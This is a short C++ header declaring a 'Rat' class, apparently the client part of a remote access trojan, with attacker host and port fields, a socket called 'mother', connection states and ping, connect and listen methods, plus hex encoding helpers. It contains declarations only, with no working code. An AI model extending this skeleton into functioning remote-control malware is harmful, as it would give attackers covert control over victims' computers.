#ifndef RAT
#define RAT

#include <config.h> // links to config.h.in
#include <ratsignal.hpp>
#include <prochandler.hpp>

#include <iostream>
#include <string>
#include <cstring>

std::string ToHex(const std::string& input);
std::string FromHex(const std::string& hex);
std::string FormatHex(const std::string& input);

enum class RatState { PINGING, ESTAB, LOST };
class Rat {
public:
    Rat();
    RatState GetState() const;
private:
    void Ping();
    bool EstablishConnection();
    void Listen();

    std::string lhost;
    RatState ratState;
    SOCKET mother;
    int lport;
};

#endif